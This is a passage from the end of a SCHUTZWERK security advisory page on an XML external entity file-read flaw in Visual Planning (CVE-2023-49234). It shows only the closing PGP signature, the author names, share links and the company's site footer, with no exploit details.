sWQ25ODCVUy6VORet8yn5OkQnM2CjSkteuTdNxCzd6JUB+vQ0g5FCE5NVzkqYq21
YJ4Fc3PgkyAnrGefSbueL+Z/K6btM8RysJAwGahIEOdlkG8W/p09L0QQUGERT2VN
UO6oTi/1OyoJBV9L5umr6aHss3P92ln90UAUW2dlZOdGSB8rlXisxLC1wtFZAXH9
YwiGY/ACXmV1FtQQpgFxfNRyEWaltU5S0Y0bPAaW+ABSMLlK4X0Ft9E/4s4Yel2d
TGngEnVKcR/PKNtrJbBqPDwt98R0MdQi0QxBRaxGxAg4Yr1qex8ph6IRT7bDTm0/
1CKlQL7y9uvXlnFE4CO3IkKNp0ejKn3A7QEep4jit07VItIc+sRsoMnB6v54DoML
ZfIisDoijb3doTNieyMpgTGZTDWLwLO36IS9JiqafNCAnngExqylFX6vYQVggtRz
mZ2yA2/9ZfQwOawEirQtQr8=
=TUGM
-----END PGP SIGNATURE-----

```

~ Lennert Preuth, David Brown

## Artikel und Informationen teilen

* [Teilen](https://www.linkedin.com/shareArticle?mini=true&summary=&title=Advisory%3a%20Arbitrary%20File%20Read%20via%20XML%20External%20Entities%20in%20Visual%20Planning%20%28CVE-2023-49234%29&url=https%3a%2f%2fwww.schutzwerk.com%2fblog%2fschutzwerk-sa-2023-006%2f "Auf LinkedIn teilen")
* [Teilen](https://www.xing.com/spi/shares/new?url=https%3a%2f%2fwww.schutzwerk.com%2fblog%2fschutzwerk-sa-2023-006%2f "Auf Xing teilen")
* [Tweet](https://twitter.com/intent/tweet?text=Advisory%3a%20Arbitrary%20File%20Read%20via%20XML%20External%20Entities%20in%20Visual%20Planning%20%28CVE-2023-49234%29&url=https%3a%2f%2fwww.schutzwerk.com%2fblog%2fschutzwerk-sa-2023-006%2f "Auf Twitter teilen")

SCHUTZWERK GmbH

Pfarrer-WeiÃ-Weg 12
89077 Ulm

Poststr. 33
20354 Hamburg

Mail: info@schutzwerk.com
Fon: +49 731 977 191 0

---

Leistungen

[PrÃ¼fung](https://www.schutzwerk.com/pruefung)

[Beratung](https://www.schutzwerk.com/beratung)

[Prozesse](https://www.schutzwerk.com/prozesse)

[FÃ¶rderungen](https://www.schutzwerk.com/foerderungen)

[Referenzen](https://www.schutzwerk.com/referenzen)

[Advisories](https://www.schutzwerk.com/advisories)

---

Unternehmen

[Blog & News](https://www.schutzwerk.com/blog)

[Wir Ã¼ber uns](https://www.schutzwerk.com/wir-ueber-uns)

[Team](https://www.schutzwerk.com/team)

[Partner](https://www.schutzwerk.com/partner)

[Zertifizierungen](https://www.schutzwerk.com/zertifizierung)

---

Karriere

[Freie Stellen](https://www.schutzwerk.com/freie-stellen)

[Warum Bewerben?](https://www.schutzwerk.com/warum-bewerben)

---

Kontakt

[Ansprechpartner](https://www.schutzwerk.com/ansprechpartner)

[Anfahrt und Parken](https://www.schutzwerk.com/anfahrt-und-parken)

[Impressum](https://www.schutzwerk.com/impressum)

[Datenschutz](https://www.schutzwerk.com/datenschutz)

---

Folge uns auf

![](https://l.schutzwerk.com/pp/p.html?idsite=4)

[Kostenfreies ErstgesprÃ¤ch](https://www.schutzwerk.com/ansprechpartner/)
